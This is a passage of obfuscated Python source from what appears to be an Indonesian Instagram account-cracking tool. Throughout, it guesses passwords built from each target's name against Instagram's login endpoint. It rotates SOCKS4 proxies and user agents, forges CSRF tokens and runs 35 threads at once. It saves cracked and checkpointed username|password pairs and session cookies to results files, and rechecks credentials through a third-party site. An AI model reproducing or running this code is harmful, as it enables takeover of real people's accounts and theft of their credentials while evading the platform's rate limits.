        print (f"""
{B}[{P}*{B}]{P} Hasil Ok Tersimpan Di Results/Ok.txt
{B}[{P}*{B}]{P} Hasil Cp Tersimpan Di Results/Cp.txt
""")#line:412
        with ThreadPoolExecutor (max_workers =35 )as (OO00O00O0OO0O00O0 ):#line:413
          for OO0O000O000O0OO0O in OO000000OOO00O0OO .list :#line:414
            O000OOO000O0O0OOO ,OO0000OO00O00OO00 =OO0O000O000O0OO0O .split ('<=>')#line:415
            OO0OO00O0OOOOOOOO =OO0000OO00O00OO00 .split (' ')#line:416
            if O00O00000OOO0OO00 in ['1','01']:#line:417
              OO00OOO0O00OOOO00 =[OO0000OO00O00OO00 ,OO0000OO00O00OO00 .replace (' ',''),OO0OO00O0OOOOOOOO [0 ]+'123',OO0OO00O0OOOOOOOO [0 ]+'12345']#line:418
            elif O00O00000OOO0OO00 in ['2','02']:#line:419
              OO00OOO0O00OOOO00 =[OO0000OO00O00OO00 ,OO0000OO00O00OO00 .replace (' ',''),OO0OO00O0OOOOOOOO [0 ]+'123',OO0OO00O0OOOOOOOO [0 ]+'1234',OO0OO00O0OOOOOOOO [0 ]+'12345',OO0OO00O0OOOOOOOO [0 ]+'123456']#line:420
            elif O00O00000OOO0OO00 in ['3','03']:#line:421
              OO00OOO0O00OOOO00 =OOOOO0OO0OOOO00O0 .split (',')#line:422
            else :#line:423
              OO00OOO0O00OOOO00 =[OO0000OO00O00OO00 ,OO0000OO00O00OO00 .replace (' ',''),OO0OO00O0OOOOOOOO [0 ]+'123',OO0OO00O0OOOOOOOO [0 ]+'12345']#line:424
            OO00O00O0OO0O00O0 .submit (OO000000OOO00O0OO .__slow__ ,OO000000OOO00O0OO .list ,O000OOO000O0O0OOO ,OO00OOO0O00OOOO00 )#line:425
        exit (f"\n{H}[{P}Selesai{H}]{P}")#line:426
      except :exit (f"\n{H}[{P}Selesai{H}]{P}")#line:427
    else :#line:428
      exit (f"{P}[{M}!{P}]{M} Wrong Input")#line:429
  def __news__ (OO0OO0O0OOOOOOO0O ,O0O0O000OO000000O ,OOO00000000OO0000 ,OO00000000OOO0000 ):#line:430
    try :#line:431
      for O0000OO0O0O0OOO0O in OO00000000OOO0000 :#line:432
        O0000OO0O0O0OOO0O =O0000OO0O0O0OOO0O .lower ()#line:433
        O0OO000O000000000 ={'http':'socks4://%s'%(random .choice (open ("Data/proxies.txt","r").read ().splitlines ()))}#line:436
        OO0OOOOOOO0OO00O0 =('ABCDEFGHIJKLMNOPQRSTUVWXYZ123456789abcdefghijklmnopqrstuvwxyz')#line:437
        OOOOOOOOO0OOOO0OO =''.join (random .choice (OO0OOOOOOO0OO00O0 )for O0000OO0000O0O000 in range (32 ))#line:438
        O00OO0O0O0OOOO000 ={'User-Agent':random .choice (open ("Data/useragent.txt","r").read ().splitlines ()),'X-Requested-With':'XMLHttpRequest','Referer':'https://www.instagram.com/accounts/login/','x-csrftoken':OOOOOOOOO0OOOO0OO }#line:444
        O0OOO0O0O0OOO0O00 ={'username':OOO00000000OO0000 ,'enc_password':f'#PWD_INSTAGRAM_BROWSER:0:{time}:{O0000OO0O0O0OOO0O}','queryParams':{},'optIntoOneTap':'false'}#line:450
        with requests .Session ()as OOO00OOOOOOOO00OO :#line:451
          OOOOOOOOO0O0O0OO0 =OOO00OOOOOOOO00OO .post ('https://www.instagram.com/accounts/login/ajax/',data =O0OOO0O0O0OOO0O00 ,headers =O00OO0O0O0OOOO000 ,proxies =O0OO000O000000000 ,allow_redirects =True )#line:452
          if 'userId'in str (OOOOOOOOO0O0O0OO0 .text ):#line:453
            try :#line:454
              O0OO0O0OO0OOO000O ='mid=Yiyh-wAEAAFn4bazVHutqTIvwKkM; '#line:455
              OOOO0O0O0OO0OOOOO ="; ".join ([str (OO0OOOOO0O000O0O0 )+"="+str (O0O0OO0OOO0OO0O0O )for OO0OOOOO0O000O0O0 ,O0O0OO0OOO0OO0O0O in OOOOOOOOO0O0O0OO0 .cookies .get_dict ().items ()])#line:456
              OO0OO0OO00000OO00 =requests .get (f'https://www.instagram.com/{OOO00000000OO0000}/?__a=1',headers ={'user-agent':useragent ,'cookie':open ('Data/cookie.txt','r').read ()}).json ()['graphql']['user']#line:457
              O0O0OO0OOO000OOOO =(OO0OO0OO00000OO00 ['edge_followed_by']['count'])#line:458
              OO0OOO0OO0OO0000O =(OO0OO0OO00000OO00 ['edge_follow']['count'])#line:459
            except (IOError ,KeyError ,ConnectionError ):#line:460
              O0O0OO0OOO000OOOO =('-')#line:461
              OO0OOO0OO0OO0000O =('-')#line:462
            except :pass #line:463
            print (f"\r{H}[{P}✔{H}]{P} Status : Success          ")#line:464
            print (f"{H}[{P}>{H}]{P} Username : {OOO00000000OO0000}")#line:465
            print (f"{H}[{P}>{H}]{P} Password : {O0000OO0O0O0OOO0O}")#line:466
            print (f"{H}[{P}>{H}]{P} Pengikut : {O0O0OO0OOO000OOOO}")#line:467
            print (f"{H}[{P}>{H}]{P} Mengikuti : {OO0OOO0OO0OO0000O}")#line:468
            print (f"{H}[{P}>{H}]{P} Cookies : {O0OO0O0OO0OOO000O}{OOOO0O0O0OO0OOOOO}\n")#line:469
            OO0OO0O0OOOOOOO0O .live .append (f'{OOO00000000OO0000}|{O0000OO0O0O0OOO0O}')#line:470
            with open ('Results/Ok.txt','a')as O00OOOOO00O0O0OO0 :#line:471
              O00OOOOO00O0O0OO0 .write (f'{OOO00000000OO0000}|{O0000OO0O0O0OOO0O}\n')#line:472
            break #line:473
          elif 'checkpoint_required'in str (OOOOOOOOO0O0O0OO0 .text ):#line:474
            try :#line:475
              OO0OO0OO00000OO00 =requests .get (f'https://www.instagram.com/{OOO00000000OO0000}/?__a=1',headers ={'user-agent':useragent ,'cookie':open ('Data/cookie.txt','r').read ()}).json ()['graphql']['user']#line:476
              O0O0OO0OOO000OOOO =(OO0OO0OO00000OO00 ['edge_followed_by']['count'])#line:477
              OO0OOO0OO0OO0000O =(OO0OO0OO00000OO00 ['edge_follow']['count'])#line:478
            except (IOError ,KeyError ,ConnectionError ):#line:479
              O0O0OO0OOO000OOOO =('-')#line:480
              OO0OOO0OO0OO0000O =('-')#line:481
            except :pass #line:482
            print (f"\r{K}[{P}✘{K}]{P} Status : Chekpoint          ")#line:483
            print (f"{K}[{P}>{K}]{P} Username : {OOO00000000OO0000}")#line:484
            print (f"{K}[{P}>{K}]{P} Password : {O0000OO0O0O0OOO0O}")#line:485
            print (f"{K}[{P}>{K}]{P} Pengikut : {O0O0OO0OOO000OOOO}")#line:486
            print (f"{K}[{P}>{K}]{P} Mengikuti : {OO0OOO0OO0OO0000O}\n")#line:487
            OO0OO0O0OOOOOOO0O .die .append (f'{OOO00000000OO0000}|{O0000OO0O0O0OOO0O}')#line:488
            with open ('Results/Cp.txt','a')as O00OOOOO00O0O0OO0 :#line:489
              O00OOOOO00O0O0OO0 .write (f'{OOO00000000OO0000}|{O0000OO0O0O0OOO0O}\n')#line:490
            break #line:491
          elif 'Please wait'in str (OOOOOOOOO0O0O0OO0 .text ):#line:492
            print (f"{P}[{M}!{P}]{M} Hidupkan Mode Pesawat 2 Detik...",end ='\r');time .sleep (10 );OO0OO0O0OOOOOOO0O .__news__ (O0O0O000OO000000O ,OOO00000000OO0000 ,OO00000000OOO0000 )#line:493
          else :#line:494
            continue #line:495
      OO0OO0O0OOOOOOO0O .looping +=1 #line:496
      print (f"{T}[{P}Crack{T}]{P} {str(len(O0O0O000OO000000O))}/{OO0OO0O0OOOOOOO0O.looping} Cp-:-{len(OO0OO0O0OOOOOOO0O.die)} Ok-:-{len(OO0OO0O0OOOOOOO0O.live)}         ",end ='\r')#line:497
    except (ConnectionError ):#line:498
      print (f"{P}[{U}!{P}]{U} Koneksi Error                     ",end ='\r');time .sleep (5 );OO0OO0O0OOOOOOO0O .__news__ (O0O0O000OO000000O ,OOO00000000OO0000 ,OO00000000OOO0000 )#line:499
    except :OO0OO0O0OOOOOOO0O .__news__ (O0O0O000OO000000O ,OOO00000000OO0000 ,OO00000000OOO0000 )#line:500
  def __fast__ (O0OOOOOOO0O00O0O0 ,OOO0OOOO0OOO00O0O ,OO0000O00OOO00O0O ,O000O00O0O0OO0O0O ):#line:501
    try :#line:502
      for O000OO00O000OOO00 in O000O00O0O0OO0O0O :#line:503
        O000OO00O000OOO00 =O000OO00O000OOO00 .lower ()#line:504
        O000OOO0000O0O0OO =('ABCDEFGHIJKLMNOPQRSTUVWXYZ123456789abcdefghijklmnopqrstuvwxyz')#line:505
        OOOOO0O00OO00OOOO =''.join (random .choice (O000OOO0000O0O0OO )for O00O0O00OO0O00000 in range (32 ))#line:506
        OO00O0O00O000OOOO ={'Host':'www.instagram.com','content-length':'388','x-ig-www-claim':'0','x-instagram-ajax':'a7173192e516','content-type':'application/x-www-form-urlencoded','accept':'*/*','x-requested-with':'XMLHttpRequest','x-asbd-id':'198387','user-agent':random .choice (open ("Data/useragent.txt","r").read ().splitlines ()),'x-csrftoken':OOOOO0O00OO00OOOO ,'x-ig-app-id':'1217981644879628','origin':'https://www.instagram.com','sec-fetch-site':'same-origin','sec-fetch-mode':'cors','sec-fetch-dest':'empty','referer':'https://www.instagram.com/','accept-encoding':'gzip, deflate','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}#line:526
        O0O000OOO0O0OOOOO ={'csrftoken':OOOOO0O00OO00OOOO }#line:529
        O0OOOO00OO00000OO ={'enc_password':f'#PWD_INSTAGRAM_BROWSER:0:{random.randint(0000000000,9999999999)}:{O000OO00O000OOO00}','username':OO0000O00OOO00O0O ,'queryParams':{},'optIntoOneTap':False ,'stopDeletionNonce':'','trustedDeviceRecords':{}}#line:537
        OOOO0O0OOO0O00OO0 ={'http':'socks4://%s'%(random .choice (open ("Data/proxies.txt","r").read ().splitlines ()))}#line:540
        with requests .Session ()as O00O00O00000OOO0O :#line:541
          OO0000O0O000O00O0 =O00O00O00000OOO0O .post ('https://www.instagram.com/accounts/login/ajax/',data =O0OOOO00OO00000OO ,headers =OO00O0O00O000OOOO ,proxies =OOOO0O0OOO0O00OO0 ,allow_redirects =True )#line:542
          if 'userId'in str (OO0000O0O000O00O0 .text ):#line:543
            try :#line:544
              OOOO0000OOOOO00O0 ='mid=Yiyh-wAEAAFn4bazVHutqTIvwKkM; '#line:545
              OOO0000O0OO00O000 ="; ".join ([str (OO0O00O0O000O000O )+"="+str (O0OO0O0OO0OOO0OOO )for OO0O00O0O000O000O ,O0OO0O0OO0OOO0OOO in OO0000O0O000O00O0 .cookies .get_dict ().items ()])#line:546
              OO000OOO00OO0OOO0 =requests .get (f'https://www.instagram.com/{OO0000O00OOO00O0O}/?__a=1',headers ={'user-agent':useragent ,'cookie':open ('Data/cookie.txt','r').read ()}).json ()['graphql']['user']#line:547
              O00OOOO0O0O00O000 =(OO000OOO00OO0OOO0 ['edge_followed_by']['count'])#line:548
              OO0OO0O00O0O00O0O =(OO000OOO00OO0OOO0 ['edge_follow']['count'])#line:549
            except (IOError ,KeyError ,ConnectionError ):#line:550
              O00OOOO0O0O00O000 =('-')#line:551
              OO0OO0O00O0O00O0O =('-')#line:552
            except :pass #line:553
            print (f"\r{H}[{P}✔{H}]{P} Status : Success          ")#line:554
            print (f"{H}[{P}>{H}]{P} Username : {OO0000O00OOO00O0O}")#line:555
            print (f"{H}[{P}>{H}]{P} Password : {O000OO00O000OOO00}")#line:556
            print (f"{H}[{P}>{H}]{P} Pengikut : {O00OOOO0O0O00O000}")#line:557
            print (f"{H}[{P}>{H}]{P} Mengikuti : {OO0OO0O00O0O00O0O}")#line:558
            print (f"{H}[{P}>{H}]{P} Cookies : {OOOO0000OOOOO00O0}{OOO0000O0OO00O000}\n")#line:559
            O0OOOOOOO0O00O0O0 .live .append (f'{OO0000O00OOO00O0O}|{O000OO00O000OOO00}')#line:560
            with open ('Results/Ok.txt','a')as O0O000O00O00O0O0O :#line:561
              O0O000O00O00O0O0O .write (f'{OO0000O00OOO00O0O}|{O000OO00O000OOO00}\n')#line:562
            break #line:563
          elif 'checkpoint_required'in str (OO0000O0O000O00O0 .text ):#line:564
            try :#line:565
              OO000OOO00OO0OOO0 =requests .get (f'https://www.instagram.com/{OO0000O00OOO00O0O}/?__a=1',headers ={'user-agent':useragent ,'cookie':open ('Data/cookie.txt','r').read ()}).json ()['graphql']['user']#line:566
              O00OOOO0O0O00O000 =(OO000OOO00OO0OOO0 ['edge_followed_by']['count'])#line:567
              OO0OO0O00O0O00O0O =(OO000OOO00OO0OOO0 ['edge_follow']['count'])#line:568
            except (IOError ,KeyError ,ConnectionError ):#line:569
              O00OOOO0O0O00O000 =('-')#line:570
              OO0OO0O00O0O00O0O =('-')#line:571
            except :pass #line:572
            print (f"\r{K}[{P}✘{K}]{P} Status : Chekpoint          ")#line:573
            print (f"{K}[{P}>{K}]{P} Username : {OO0000O00OOO00O0O}")#line:574
            print (f"{K}[{P}>{K}]{P} Password : {O000OO00O000OOO00}")#line:575
            print (f"{K}[{P}>{K}]{P} Pengikut : {O00OOOO0O0O00O000}")#line:576
            print (f"{K}[{P}>{K}]{P} Mengikuti : {OO0OO0O00O0O00O0O}\n")#line:577
            O0OOOOOOO0O00O0O0 .die .append (f'{OO0000O00OOO00O0O}|{O000OO00O000OOO00}')#line:578
            with open ('Results/Cp.txt','a')as O0O000O00O00O0O0O :#line:579
              O0O000O00O00O0O0O .write (f'{OO0000O00OOO00O0O}|{O000OO00O000OOO00}\n')#line:580
            break #line:581
          elif 'Please wait'in str (OO0000O0O000O00O0 .text ):#line:582
            print (f"{P}[{M}!{P}]{M} Hidupkan Mode Pesawat 2 Detik...",end ='\r');time .sleep (10 );O0OOOOOOO0O00O0O0 .__fast__ (OOO0OOOO0OOO00O0O ,OO0000O00OOO00O0O ,O000O00O0O0OO0O0O )#line:583
          else :#line:584
            continue #line:585
      O0OOOOOOO0O00O0O0 .looping +=1 #line:586
      print (f"{T}[{P}Crack{T}]{P} {str(len(OOO0OOOO0OOO00O0O))}/{O0OOOOOOO0O00O0O0.looping} Cp-:-{len(O0OOOOOOO0O00O0O0.die)} Ok-:-{len(O0OOOOOOO0O00O0O0.live)}         ",end ='\r')#line:587
    except (ConnectionError ):#line:588
      print (f"{P}[{U}!{P}]{U} Koneksi Error                     ",end ='\r');time .sleep (5 );O0OOOOOOO0O00O0O0 .__fast__ (OOO0OOOO0OOO00O0O ,OO0000O00OOO00O0O ,O000O00O0O0OO0O0O )#line:589
    except :O0OOOOOOO0O00O0O0 .__fast__ (OOO0OOOO0OOO00O0O ,OO0000O00OOO00O0O ,O000O00O0O0OO0O0O )#line:590
  def __slow__ (OO00OOOOOOO00O000 ,OO00O00O00OOO0O00 ,OO0OO0O0OO0OO000O ,O0OO0O0OOOO0OO0OO ):#line:591
    try :#line:592
      for O000O000O000000OO in O0OO0O0OOOO0OO0OO :#line:593
        O000O000O000000OO =O000O000O000000OO .lower ()#line:594
        O0O0OO0OO0OO0O00O =requests .get ('https://www.instagram.com').cookies .get_dict ()['csrftoken']#line:597
        O0O0000O0O0OO0O0O ={'Host':'www.instagram.com','content-length':'388','x-ig-www-claim':'0','x-instagram-ajax':'a7173192e516','content-type':'application/x-www-form-urlencoded','accept':'*/*','x-requested-with':'XMLHttpRequest','x-asbd-id':'198387','user-agent':random .choice (open ("Data/useragent.txt","r").read ().splitlines ()),'x-csrftoken':O0O0OO0OO0OO0O00O ,'x-ig-app-id':'1217981644879628','origin':'https://www.instagram.com','sec-fetch-site':'same-origin','sec-fetch-mode':'cors','sec-fetch-dest':'empty','referer':'https://www.instagram.com/','accept-encoding':'gzip, deflate','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}#line:617
        O0O0OOO000000O0O0 ={'csrftoken':O0O0OO0OO0OO0O00O }#line:620
        O00O0O000000O0O00 ={'enc_password':f'#PWD_INSTAGRAM_BROWSER:0:{random.randint(0000000000,9999999999)}:{O000O000O000000OO}','username':OO0OO0O0OO0OO000O ,'queryParams':{},'optIntoOneTap':False ,'stopDeletionNonce':'','trustedDeviceRecords':{}}#line:628
        OO000000000O0OOO0 ={'http':'socks4://%s'%(random .choice (open ("Data/proxies.txt","r").read ().splitlines ()))}#line:631
        with requests .Session ()as OOOOO0OOOOO00O0O0 :#line:632
          O0OOOOO0O0O00000O =OOOOO0OOOOO00O0O0 .post ('https://www.instagram.com/accounts/login/ajax/',data =O00O0O000000O0O00 ,headers =O0O0000O0O0OO0O0O ,proxies =OO000000000O0OOO0 ,allow_redirects =True )#line:633
          if 'userId'in str (O0OOOOO0O0O00000O .text ):#line:634
            try :#line:635
              OOOOOOO0O000OOO00 ='mid=Yiyh-wAEAAFn4bazVHutqTIvwKkM; '#line:636
              O0OO000O00O000000 ="; ".join ([str (OOOOO0OOOOOOO0O00 )+"="+str (O0OOOO000O00OOOO0 )for OOOOO0OOOOOOO0O00 ,O0OOOO000O00OOOO0 in O0OOOOO0O0O00000O .cookies .get_dict ().items ()])#line:637
              O000O00OOOO0OOOOO =requests .get (f'https://www.instagram.com/{OO0OO0O0OO0OO000O}/?__a=1',headers ={'user-agent':useragent ,'cookie':open ('Data/cookie.txt','r').read ()}).json ()['graphql']['user']#line:638
              OO0O00000O00OOO0O =(O000O00OOOO0OOOOO ['edge_followed_by']['count'])#line:639
              OO0O00O0O000O00O0 =(O000O00OOOO0OOOOO ['edge_follow']['count'])#line:640
            except (IOError ,KeyError ,ConnectionError ):#line:641
              OO0O00000O00OOO0O =('-')#line:642
              OO0O00O0O000O00O0 =('-')#line:643
            except :pass #line:644
            print (f"\r{H}[{P}✔{H}]{P} Status : Success          ")#line:645
            print (f"{H}[{P}>{H}]{P} Username : {OO0OO0O0OO0OO000O}")#line:646
            print (f"{H}[{P}>{H}]{P} Password : {O000O000O000000OO}")#line:647
            print (f"{H}[{P}>{H}]{P} Pengikut : {OO0O00000O00OOO0O}")#line:648
            print (f"{H}[{P}>{H}]{P} Mengikuti : {OO0O00O0O000O00O0}")#line:649
            print (f"{H}[{P}>{H}]{P} Cookies : {OOOOOOO0O000OOO00}{O0OO000O00O000000}\n")#line:650
            OO00OOOOOOO00O000 .live .append (f'{OO0OO0O0OO0OO000O}|{O000O000O000000OO}')#line:651
            with open ('Results/Ok.txt','a')as OO00OOOO0000OO0OO :#line:652
              OO00OOOO0000OO0OO .write (f'{OO0OO0O0OO0OO000O}|{O000O000O000000OO}\n')#line:653
            break #line:654
          elif 'checkpoint_required'in str (O0OOOOO0O0O00000O .text ):#line:655
            try :#line:656
              O000O00OOOO0OOOOO =requests .get (f'https://www.instagram.com/{OO0OO0O0OO0OO000O}/?__a=1',headers ={'user-agent':useragent ,'cookie':open ('Data/cookie.txt','r').read ()}).json ()['graphql']['user']#line:657
              OO0O00000O00OOO0O =(O000O00OOOO0OOOOO ['edge_followed_by']['count'])#line:658
              OO0O00O0O000O00O0 =(O000O00OOOO0OOOOO ['edge_follow']['count'])#line:659
            except (IOError ,KeyError ,ConnectionError ):#line:660
              OO0O00000O00OOO0O =('-')#line:661
              OO0O00O0O000O00O0 =('-')#line:662
            except :pass #line:663
            print (f"\r{K}[{P}✘{K}]{P} Status : Chekpoint          ")#line:664
            print (f"{K}[{P}>{K}]{P} Username : {OO0OO0O0OO0OO000O}")#line:665
            print (f"{K}[{P}>{K}]{P} Password : {O000O000O000000OO}")#line:666
            print (f"{K}[{P}>{K}]{P} Pengikut : {OO0O00000O00OOO0O}")#line:667
            print (f"{K}[{P}>{K}]{P} Mengikuti : {OO0O00O0O000O00O0}\n")#line:668
            OO00OOOOOOO00O000 .die .append (f'{OO0OO0O0OO0OO000O}|{O000O000O000000OO}')#line:669
            with open ('Results/Cp.txt','a')as OO00OOOO0000OO0OO :#line:670
              OO00OOOO0000OO0OO .write (f'{OO0OO0O0OO0OO000O}|{O000O000O000000OO}\n')#line:671
            break #line:672
          elif 'Please wait'in str (O0OOOOO0O0O00000O .text ):#line:673
            print (f"{P}[{M}!{P}]{M} Hidupkan Mode Pesawat 2 Detik...",end ='\r');time .sleep (10 );OO00OOOOOOO00O000 .__slow__ (OO00O00O00OOO0O00 ,OO0OO0O0OO0OO000O ,O0OO0O0OOOO0OO0OO )#line:674
          else :#line:675
            continue #line:676
      OO00OOOOOOO00O000 .looping +=1 #line:677
      print (f"{T}[{P}Crack{T}]{P} {str(len(OO00O00O00OOO0O00))}/{OO00OOOOOOO00O000.looping} Cp-:-{len(OO00OOOOOOO00O000.die)} Ok-:-{len(OO00OOOOOOO00O000.live)}         ",end ='\r')#line:678
    except (ConnectionError ):#line:679
      print (f"{P}[{U}!{P}]{U} Koneksi Error                     ",end ='\r');time .sleep (5 );OO00OOOOOOO00O000 .__slow__ (OO00O00O00OOO0O00 ,OO0OO0O0OO0OO000O ,O0OO0O0OOOO0OO0OO )#line:680
    except :OO00OOOOOOO00O000 .__slow__ (OO00O00O00OOO0O00 ,OO0OO0O0OO0OO000O ,O0OO0O0OOOO0OO0OO )#line:681
class __crack__ :#line:683
  def __init__ (O00000OOOOO0O0OO0 ):#line:685
    O00000OOOOO0O0OO0 .looping =0 #line:686
    O00000OOOOO0O0OO0 .live =[]#line:687
    O00000OOOOO0O0OO0 .die =[]#line:688
    try :#line:689
      O00000OOOOO0O0OO0 .file =input (f"\n{B}[{P}*{B}]{P} Contoh : Results/Cp.txt\n{B}[{P}?{B}]{P} File : ")#line:690
      if len (O00000OOOOO0O0OO0 .file )==0 :#line:691
        exit (f"{P}[{M}!{P}]{M} Jangan Kosong")#line:692
      else :#line:693
        O00000OOOOO0O0OO0 .split =input (f"{B}[{P}?{B}]{P} Pemisah : ");print (" ")#line:694
        if len (O00000OOOOO0O0OO0 .split )==0 :#line:695
          exit (f"{P}[{M}!{P}]{M} Jangan Kosong")#line:696
        else :#line:697
          O00000OOOOO0O0OO0 .list =open (O00000OOOOO0O0OO0 .file ,'r').read ().splitlines ()#line:698
          if len (O00000OOOOO0O0OO0 .list )==0 :#line:699
            exit (f"{P}[{M}!{P}]{M} File Kosong")#line:700
          for OO0O00O0000OOOOO0 in O00000OOOOO0O0OO0 .list :#line:701
            OOOOO00OOOOO0O000 =OO0O00O0000OOOOO0 .split (O00000OOOOO0O0OO0 .split )[0 ]#line:702
            OOO00OOO0000O0OO0 =OO0O00O0000OOOOO0 .split (O00000OOOOO0O0OO0 .split )[1 ]#line:703
            O00000OOOOO0O0OO0 .__main__ (O00000OOOOO0O0OO0 .list ,OOOOO00OOOOO0O000 ,OOO00OOO0000O0OO0 )#line:704
          exit (f"\n{H}[{P}Selesai{H}]{P}")#line:705
    except (IOError ):#line:706
      exit (f"{P}[{M}!{P}]{M} File Tidak Ada")#line:707
    except Exception as O0000O0OO00000O00 :#line:708
      exit (f"{P}[{M}!{P}]{M} {O0000O0OO00000O00}")#line:709
  def __main__ (O0O00O0O00000O000 ,OOOO0O0OOO00OOO00 ,OOO00OOO0OOOOO0OO ,OOO0OO00000000OO0 ):#line:710
    try :#line:711
      print (f"{T}[{P}Crack{T}]{P} {str(len(OOOO0O0OOO00OOO00))}/{O0O00O0O00000O000.looping} Cp-:-{len(O0O00O0O00000O000.die)} Ok-:-{len(O0O00O0O00000O000.live)}     ",end ='\r')#line:712
      OO0000O0OO0OOOO00 ={'Host':'igfollower.net','content-length':'93','accept':'application/json, text/javascript, */*; q=0.01','x-requested-with':'XMLHttpRequest','user-agent':random .choice (open ("Data/useragent.txt","r").read ().splitlines ()),'content-type':'application/x-www-form-urlencoded; charset=UTF-8','origin':'https://igfollower.net','sec-fetch-site':'same-origin','sec-fetch-mode':'cors','sec-fetch-dest':'empty','referer':'https://igfollower.net/girisyap','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}#line:726
      O0OOO0O0OO0O00OO0 ={'username':OOO00OOO0OOOOO0OO ,'password':OOO0OO00000000OO0 ,'userid':''}#line:731
      O0OO00O00OOO0000O ={'http':'socks4://%s'%(random .choice (open ("Data/proxies.txt","r").read ().splitlines ()))}#line:734
      with requests .Session ()as OO0OO000O0O00000O :#line:735
        OO00OO00O0OOOOOOO =OO0OO000O0O00000O .post ('https://igfollower.net/girisyap?',data =O0OOO0O0OO0O00OO0 ,headers =OO0000O0OO0OOOO00 ,proxies =O0OO00O00OOO0000O ,timeout =None )#line:736
        if 'success'in str (OO00OO00O0OOOOOOO .json ()):#line:737
          O0O00O0O00000O000 .looping +=1 #line:738
          print (f"\r{H}[{P}Ok{H}]{P} {OOO00OOO0OOOOO0OO}|{OOO0OO00000000OO0}     ")#line:739
          O0O00O0O00000O000 .live .append (f'{OOO00OOO0OOOOO0OO}|{OOO0OO00000000OO0}')#line:740
        elif 'checkpoint'in str (OO00OO00O0OOOOOOO .json ()):#line:741
          O0O00O0O00000O000 .looping +=1 #line:742
          print (f"\r{K}[{P}Cp{K}]{P} {OOO00OOO0OOOOO0OO}|{OOO0OO00000000OO0}     ")#line:743
          O0O00O0O00000O000 .die .append (f'{OOO00OOO0OOOOO0OO}|{OOO0OO00000000OO0}')#line:744
        else :#line:745
          O0O00O0O00000O000 .looping +=1 #line:746
    except (ConnectionError ):#line:747
      print (f"{P}[{U}!{P}]{U} Koneksi Error               ",end ='\r');time .sleep (8 );O0O00O0O00000O000 .__main__ (OOOO0O0OOO00OOO00 ,OOO00OOO0OOOOO0OO ,OOO0OO00000000OO0 )#line:748
    except :O0O00O0O00000O000 .__main__ (OOOO0O0OOO00OOO00 ,OOO00OOO0OOOOO0OO ,OOO0OO00000000OO0 )#line:749
def __masuk__ ():#line:751
  try :#line:752
    O000000OO0OOO000O =open ('Data/apikey.txt','r').read ()#line:753
  except (IOError ):#line:754
    __apikey__ ()#line:755
  else :#line:756
    __menu__ ()

